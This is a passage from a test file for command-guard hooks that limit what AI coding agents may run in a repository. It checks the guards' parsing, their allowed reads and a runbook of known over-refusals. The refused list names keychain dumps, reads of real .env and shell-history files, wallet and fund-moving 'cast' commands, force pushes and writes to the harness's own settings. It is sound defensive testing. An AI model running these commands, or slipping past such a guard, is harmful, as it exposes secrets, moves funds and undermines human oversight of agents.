  '7 tracked templates: .env*.example': { agents: ALL_AGENTS, cmds: ['cat contracts/order-engine/executor/.env.executor.example', 'cat .env.example', 'head -3 .env.keeper.example', 'cat ./.env.local.example', 'grep KEY contracts/order-engine/executor/.env.executor.example', 'node -e "console.log(require(\'fs\').readFileSync(\'.env.executor.example\',\'utf8\'))"'] },
  '8 harness reads: leading cd / -C and git blame, git ls-files, jq': {
    agents: ALL_AGENTS,
    cmds: [`git -C ${WT} diff -- .claude/hooks`, `cd ${WT} && cat .claude/settings.json`, 'git blame .claude/settings.json', 'git blame -L1,5 -- .claude/hooks/command-guard.mjs', 'git ls-files .claude', 'git ls-files -- .claude/hooks', 'jq . .claude/settings.json',
      `cd ${WT} && git log --oneline -3 -- .claude/hooks`, `git -C ${WT} blame .claude/settings.json | head -3`, `cd ${WT} && jq .permissions .claude/settings.json | head`, `cd ${WT} && cd src && ls`],
  },
  'read-only: stash list, reflog, symbolic-ref -q HEAD, verify-commit': { agents: READ_ONLY, cmds: ['git stash list', 'git reflog', 'git reflog show HEAD', 'git symbolic-ref -q HEAD', 'git symbolic-ref --short HEAD', 'git verify-commit HEAD', 'git verify-commit -v HEAD'] },
  'ls -d .* lists names': { agents: ALL_AGENTS, cmds: ['ls -d .*', 'ls -a -d .?*'] },
}
const A77D_REFUSED = {
  '1 the keychain command and the history names stay refused': ['security dump-keychain', 'git log --grep=security && security find-generic-password -s x', 'git log --grep security', 'security', 'cat ~/.zsh_history'],
  '2 a bare shell reads stdin': ['bash', 'bash -s', 'sh', 'echo x | bash', 'bash --version -c "ssh h"', 'bash -c "ssh h"'],
  '3 the wallet subcommand and every other fund mover': ['cast wallet new', 'cast wallet sign x', 'cast send 0x0 "f()"', 'cast erc20 transfer 0x0 1', 'cast publish 0xab', 'cast mktx 0x0 "f()"', 'cast "$SUB" 0x0', 'cast $SUB 0x0', 'cast call 0x0 "f()" $(cast wallet new)'],
  '4 gh writes (same segment, other segments feeding argv, verbs)': ['gh api x -f a=b | cat', 'gh api x -F a=b 2>&1 | cat', 'gh api -X POST x | grep -F y', 'gh pr diff 5 | grep -F x; gh api x -f a=b', 'echo -f | xargs gh api x', 'echo -f a=b | while read x; do gh api y $x; done',
    'echo "-f a=b" | gxargs gh api y', 'gh pr merge 5 | cat', 'gh pr view 5 | gh pr close 5', 'gh api x "a|b" -f a=b', 'gh api x --method POST | cat'],
  '5 push force / delete / refspec forms (and what xargs or an expansion can feed them)': ['git push -f origin x', 'git push origin x --force', 'git fetch --prune && git push --force origin x', 'git stash push && git push -f', 'git stash push -m x; git push origin +x', 'git push origin x 2>&1 --force',
    'git push origin :x', 'git push --delete origin x', 'git push origin x | cat; git push -f', 'echo -f | xargs git push', 'git push $(echo --force)', 'git push origin "$FLAGS"', 'git push --mirror', 'git -C wt push -uf origin x'],
  '6 add … && commit does not exempt anything else': ['git add .env && git commit -m x', 'git add .claude/hooks/x && git commit -m x', 'git add -A && git commit -m "$(ssh h)"', 'git add -A; git commit -m ".env"', 'git add -A && git commit -m "x" && ssh h',
    'git add -A && git commit -F .env', 'git add "$X" && git commit -m ".env"', 'git add -A && ssh host && git commit -m x', 'git add -A && git commit -m "x" -- .claude/hooks'],
  '7 real env files, globs and look-alikes': ['cat .env', 'cat .env.local', 'cat .env.production', 'cat ./apps/web/.env', 'cat .env.example.bak', 'cat .env.local.bak', 'cat .env*', 'cat .env.*', 'cat .env.example.local', 'cp .env.example .env', 'cat .env.example .env', 'cat .env.example/../.env',
    'grep KEY .env.example.bak', 'node -e "readFileSync(\'.env.local\')"', 'git add .env.local'],
  '8 harness writes, cd/-C INTO the harness, redirects and non-readers': ['cat .claude/settings.json > x', `cd ${WT} && cat x > .claude/settings.json`, 'cd .claude && cat settings.json', 'git -C .claude diff', 'git -C ../.claude log', `cd ${WT} && rm .claude/settings.json`,
    'jq . x > .claude/settings.json', 'git blame x | tee .claude/hooks/x', 'git ls-files > .claude/settings.json', 'cd .claude/hooks && ls', `cd ${WT}; cat .claude/settings.json`, `cd ${WT} && cat .claude/settings.json; rm x`, 'jq . .claude/settings.json >> x',
    'git ls-files --output=x .claude/hooks', 'cat $(echo .claude/hooks/x)', 'echo x > .claude/hooks/a', 'sed -i s/a/b/ .claude/settings.json'],
  'read-only: the write forms of the same subcommands': ['git stash', 'git stash push', 'git stash pop', 'git stash drop', 'git stash clear', 'git reflog expire --all', 'git reflog delete HEAD@{0}', 'git symbolic-ref HEAD refs/heads/x', 'git symbolic-ref -d HEAD', 'git symbolic-ref -m x HEAD', 'git verify-commit --exec x HEAD'],
  'ls: a glob with a literal start still names a secret': ['cat .*', 'ls -d .env*', 'ls .zsh_hist*', 'cat .?*', 'head -1 .*'],
}
describe('A77d commit 2 — allowed through both wired hooks, for the agents that may run it', () => {
  for (const [item, { agents, cmds }] of Object.entries(A77D_ALLOWED)) {
    describe(item, () => {
      for (const c of cmds) {
        it(`allows: ${JSON.stringify(c).slice(0, 110)}`, () => {
          if (agents === ALL_AGENTS || agents === MAIN_IMPL) expect(guardDecide(c), c).toBeNull()
          for (const agent of agents) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(0)
        })
      }
    })
  }
})
describe('A77d commit 2 — near-misses stay refused (nothing is loosened beyond the item)', () => {
  for (const [item, cmds] of Object.entries(A77D_REFUSED)) {
    describe(item, () => {
      for (const c of cmds) {
        it(`refuses: ${JSON.stringify(c).slice(0, 110)}`, () => {
          const readOnlyRow = item.startsWith('read-only') // readonly-guard's rows: command-guard lets the main session run them
          for (const agent of readOnlyRow ? READ_ONLY : ALL_AGENTS) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(2)
        })
      }
    })
  }
})
describe('A77d commit 2 — the building blocks', () => {
  it('splitRegions: quote-aware, and `>&` / `<&` / `&>` are redirections, not separators', async () => {
    const { splitRegions } = await import('../.claude/hooks/raw-scan.mjs')
    expect(splitRegions('a | b && c ; d', '|')).toEqual(['a', 'b && c ; d'])
    expect(splitRegions('a | b && c ; d', '|&;\n')).toEqual(['a', 'b', 'c', 'd'])
    expect(splitRegions('echo "a|b" | c', '|')).toEqual(['echo a|b', 'c'])
    expect(splitRegions('git push x 2>&1 --force', '|&;\n')).toEqual(['git push x 2>&1 --force'])
    expect(splitRegions('git push x &>/dev/null', '|&;\n')).toEqual(['git push x &>/dev/null'])
    expect(splitRegions('echo "unterminated | x', '|')).toEqual(['echo unterminated | x'])
  })
  it('layer 1 alone keeps its own rules: `.env*.example` is a template, `.env.example.bak` is not; `ls -d .*` only for name-only commands', () => {
    for (const c of ['cat .env.executor.example', 'cat a/.env.keeper.example']) expect(decideParsed(c), c).toBeNull()
    for (const c of ['cat .env.example.bak', 'cat .env.local', 'cat .*', 'node -e "readFileSync(\'.env.x\')"']) expect(decideParsed(c), c).toEqual(expect.any(String))
    expect(decideParsed('ls -d .*')).toBeNull()
    expect(decideParsed('ls .zsh_hist*')).toEqual(expect.any(String))
  })
  it('isPureReader accepts a leading `cd DIR &&`, `git -C DIR`, blame, ls-files and jq — and nothing with a redirect', () => {
    for (const c of ['cd wt && cat .claude/settings.json', 'git -C wt diff -- .claude/hooks', 'git blame .claude/settings.json', 'git ls-files .claude', 'jq . .claude/settings.json', 'cd a && cd b && ls', 'git --no-pager -C wt log -1 | head -2']) expect(isPureReader(c), c).toBe(true)
    for (const c of ['cd wt; cat x', 'cd wt && cat x > y', 'jq . x > y', 'cd .claude && ls', 'git -C .claude diff', 'git ls-files --output=f', 'cd wt && rm x', 'cd $D && cat x', 'git -C wt add x']) expect(isPureReader(c), c).toBe(false)
  })
  it('a lone commit may follow `git add … &&` only', () => {
    expect(loneCommitRemainder('git add -A && git commit -m "ssh"')).toBe('git add -A && git commit -m ""')
    expect(loneCommitRemainder('git add .env && git commit -m "ssh"')).toContain('git add .env')
    for (const c of ['git add -A; git commit -m x', 'git add "a b" && git commit -m x', 'git add -A && git push', 'git add -A && git commit -m x && ls', 'git add $(ls) && git commit -m x']) expect(loneCommitRemainder(c), c).toBeNull()
  })
})

// A77d commit 3 — the runbook says plainly what the guards cannot do for you.
describe('A77d runbook: linked worktrees, the unguarded branch, and the over-refusals that remain on purpose', () => {
  const rb = readFileSync(path.join(ROOT, 'docs', 'Runbooks', 'agent-harness.md'), 'utf8')
  const section = rb.slice(rb.indexOf('## Read-only agents work in a linked worktree'), rb.indexOf('## When a refused command is legitimate'))
  it('read-only agents work in a linked worktree (git worktree add --detach), never the main checkout, and why', () => {
    expect(section.length).toBeGreaterThan(1500)
    for (const needle of ['never in the main checkout', 'linked worktree', '`.git` is a directory', '`.git` is a file', 'git worktree add --detach', 'git -C', 'cd DIR &&', '`git fetch` stays allowed', 'owner ruling', 'cannot determine']) expect(section, needle).toContain(needle)
  })
  it('a branch without .claude/ has NO guard, and the owner gets a one-line check that really answers', () => {
    expect(section).toContain('NO GUARD')
    expect(section).toContain('every branch cut from `main`')
    const line = section.split('\n').find((l) => l.startsWith('git cat-file -e'))
    expect(line).toBe('git cat-file -e <branch>:.claude/hooks/readonly-guard.mjs 2>/dev/null && echo guarded || echo "NO GUARD"')
    const sh = (ref) => spawnSync('sh', ['-c', line.replace('<branch>', ref)], { cwd: ROOT, encoding: 'utf8' }).stdout.trim()
    expect(sh('HEAD:nope-no-such').length).toBeGreaterThan(0) // the pipeline always prints one of the two words
    expect(['guarded', 'NO GUARD']).toContain(sh('HEAD'))
    expect(sh('0000000000000000000000000000000000000000')).toBe('NO GUARD')
  })
  it('names the over-refusals that remain on purpose and how to phrase around them', () => {
    const over = rb.slice(rb.indexOf('**It over-refuses on purpose.**'), rb.indexOf('## Allow-lists'))
    for (const needle of ['`git add .claude/hooks/x`', '`git add -u`', '`push` with another tool\'s `-f`', 'two calls', '`git stash push -m "a + b"`', '`a plus b`', 'layer 2']) expect(over, needle).toContain(needle)
  })
  it('the allow-list tables list the new read-only forms and the where-it-runs condition', () => {
    for (const needle of ['`stash list` only', '`symbolic-ref [-q] [--short] [--no-recurse] <name>`', '`verify-commit`', '`reflog`', 'only where the effective directory is a linked worktree']) expect(rb, needle).toContain(needle)
  })
})
